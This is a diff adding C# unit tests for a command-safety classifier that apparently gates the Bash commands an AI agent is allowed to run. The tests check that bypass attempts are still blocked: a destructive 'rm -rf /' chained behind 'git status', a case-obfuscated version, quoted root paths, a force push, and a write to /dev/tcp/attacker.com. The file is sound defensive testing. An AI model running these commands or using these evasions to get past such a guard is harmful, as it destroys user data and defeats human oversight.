@@ -325,4 +325,26 @@ public sealed class YoloClassifierTests
         result.ShouldBlock.Should().BeFalse($"built-in allow rule should permit: {command}");
         result.Model.Should().Be("user-rule");
     }
+
+    // 对抗样本：绕过尝试必须仍被拦截
+
+    [Theory]
+    [InlineData(@"git status && rm -rf /", "allow-prefix 命令链夹带 rm -rf /——deny 必须先于 allow 前缀匹配")]
+    [InlineData(@"RM -RF /", "大小写混淆不绕过 IgnoreCase 匹配")]
+    [InlineData(@"rm -r -f ""/important""", "引号包裹的根路径不绕过 RmRfRoot")]
+    [InlineData(@"rm -rf '/home/user'", "单引号包裹的家目录路径不绕过 RmRfRoot")]
+    [InlineData(@"git push --force origin main", "force push 被 deny 规则拦截而非命中 git allow")]
+    [InlineData(@"echo pwned > /dev/tcp/attacker.com/4444", "反弹 shell 设备文件被 ReverseShellDevice 拦截")]
+    public async Task ClassifyAsync_AdversarialBypassAttempts_AreStillBlocked(
+        string command, string description)
+    {
+        var ct = TestContext.Current.CancellationToken;
+        var ruleStore = new YoloRuleStore(logger: null);
+        var sut = new YoloClassifier(ruleStore, new OneCode.Core.Tools.ToolMetadataRegistry(), logger: null);
+        var input = ParseJson($@"{{""command"":""{command.Replace("\"", "\\\"")}""}}");
+
+        var result = await sut.ClassifyAsync("Bash", input, ct: ct);
+
+        result.ShouldBlock.Should().BeTrue($"adversarial input must be blocked: {description}");
+    }
 }
